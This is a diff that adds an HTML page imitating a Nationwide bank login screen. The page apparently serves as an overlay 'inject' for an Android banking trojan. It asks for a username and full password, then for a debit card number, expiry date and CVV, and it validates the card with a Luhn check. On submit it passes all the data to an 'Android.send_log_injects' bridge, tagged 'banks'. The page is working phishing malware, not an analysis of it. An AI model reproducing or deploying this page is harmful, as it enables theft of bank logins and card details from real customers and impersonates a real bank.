@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        body {
+            background-color: #2542b7;
+        }
+
+        #form1, #form2 {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        section {
+            flex: 1;
+            padding: 15px;
+        }
+
+        footer {
+            padding: 15px;
+        }
+
+        label {
+            color: #fff;
+            margin: 0;
+        }
+
+        .input {
+            width: 100%;
+            padding: 8px;
+            border: 0;
+            border-bottom: 1px solid #3154c8;
+            margin-bottom: 20px;
+            background-color: transparent;
+            color: #fff;
+        }
+
+        .input:focus {
+            border-color: #fff;
+        }
+
+        p {
+            text-align: center;
+            color: #fff;
+            padding: 15px;
+            font-weight: 500;
+        }
+
+        .button {
+            width: 100%;
+            padding: 10px;
+            border: 0;
+            border-radius: 25px;
+            background-color: #fff;
+            color: #2542b7;
+            font-size: 14px;
+        }
+
+        .button:disabled {
+            background-color: #2953c9;
+            color: #768ddb;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <div id="form1">
+            <header>
+                <p>Log In</p>
+            </header>
+            <section>
+                <label for="login"> Customer Number or Username</label>
+                <input type="text" class="input" id="login" name="login" placeholder="" autocomplete="off">
+
+                <label for="password">Enter your full password</label>
+                <input type="password" class="input" id="password" name="password" placeholder="" autocomplete="off">
+            </section>
+            <footer>
+                <input type="submit" class="button" id="nextPage" disabled value="Continue">
+            </footer>
+        </div>
+        <div id="form2" style="display: none;">
+            <header>
+                <p style="text-align: center;color: #fff;font-weight: 600;font-size: 18px;margin-bottom: 5px;">Enter your Nationwide debit card details</p>
+                
+                <p style="text-align: center;color: #fff;font-size: 14px;">You can use any Nationwide debit card, and we'll only use it to look up your account details.</p>
+            </header>
+            <section>
+                <label for="cc"> 16 digit card number </label>
+                <input type="tel" class="input" id="cc" name="cc" onkeyup="check3()" placeholder="" autocomplete="off">
+
+                <label for="exp" style="float: left; width: 48%;"> Expiry date </label>
+                <label for="cvv" style="float: right; width: 48%;"> CVV </label>
+
+                <input type="tel" class="input" id="exp" style="float: left; width: 48%;" name="exp" onkeyup="check3()" placeholder="" autocomplete="off">
+                <input type="password" inputmode="tel" class="input" id="cvv" style="float: right; width: 48%;" name="cvv" onkeyup="check3()" placeholder="" autocomplete="off">
+            </section>
+            <footer>
+                <input type="submit" class="button" id="sendData" disabled value="Continue">
+            </footer>
+        </div>
+    </form>
+    <script>
+        $('#cc').mask('0000 0000 0000 0000');
+        $('#exp').mask('00/00');
+        $('#cvv').mask('000');
+
+        var form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2');
+
+        var login = document.getElementById('login'),
+            password = document.getElementById('password');
+
+        var cc = document.getElementById('cc'),
+            exp = document.getElementById('exp'),
+            cvv = document.getElementById('cvv');
+
+        var nextPage = document.getElementById('nextPage'),
+            sendData = document.getElementById('sendData');
+
+        login.onkeyup = () => {
+            if(login.value.length >= 4 && password.value.length >= 6) {
+                nextPage.disabled = false;
+            } else {
+                nextPage.disabled = true;
+            }
+        }
+
+        password.onkeyup = () => {
+            if(login.value.length >= 4 && password.value.length >= 6) {
+                nextPage.disabled = false;
+            } else {
+                nextPage.disabled = true;
+            }
+        }
+
+        nextPage.onclick = () => {
+            form1.style.display = 'none';
+            form2.style.display = 'flex';
+        }
+
+        function check3() {
+            var mmYY = exp.value.split('/');
+			var month = parseInt(mmYY[0]);
+			var year = parseInt(mmYY[1]);
+
+			var expArray = exp.value.split('/');
+			var today, someday;
+			var exMonth = expArray[0];
+			var exYear = "20" + expArray[1];
+
+			today = new Date();
+			someday = new Date();
+			someday.setFullYear(exYear, exMonth, 1);
+
+            function expCheck() {
+                if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
+                    return false
+                } else {
+                    return true
+                }
+            }
+
+            if(valid_credit_card(cc.value) && expCheck() == true && cvv.value.length == 3) {
+                sendData.disabled = false
+            } else {
+                sendData.disabled = true
+            }
+        }
+
+        sendData.onclick = () => {
+        var data = {};
+            data.login = login.value;
+            data.password = password.value;
+            data.cc = cc.value;
+            data.exp = exp.value;
+            data.cvv = cvv.value;
+            data.type_injects = "banks";
+            data.closed = "close_activity_injects";
+
+            var ua = navigator.userAgent.toLowerCase();
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+        }
+        
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+        }
+
+    if ( typeof Android == "undefined")
+        var Android = {
+            returnResult : alert.bind(window)
+        }
+    
+    var stringifyJSON = function(obj) {
+        var arrOfKeyVals = [],
+            arrVals = [],
+            objKeys = [];
+    
+        if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+            return '' + obj;
+        else if (typeof obj === 'string')
+            return '"' + obj + '"';
+    
+        else if (Array.isArray(obj)) {
+            if (obj[0] === undefined)
+                return '[]';
+            else {
+                obj.forEach(function(el) {
+                    arrVals.push(stringifyJSON(el));
+                });
+                return '[' + arrVals.join(',') + ']';
+            }
+        }else if (obj instanceof Object) {
+            objKeys = Object.keys(obj);
+            objKeys.forEach(function(key) {
+                var keyOut = '"' + key + '":';
+                var keyValOut = obj[key];
+                if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                    arrOfKeyVals.push('');
+                else if (typeof keyValOut === 'string')
+                    arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+                else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                    arrOfKeyVals.push(keyOut + keyValOut);
+                else if (keyValOut instanceof Object) {
+                    arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+                }
+            });
+            return '{' + arrOfKeyVals + '}';
+        }
+    }; 
+    </script>
+</body>
+</html>
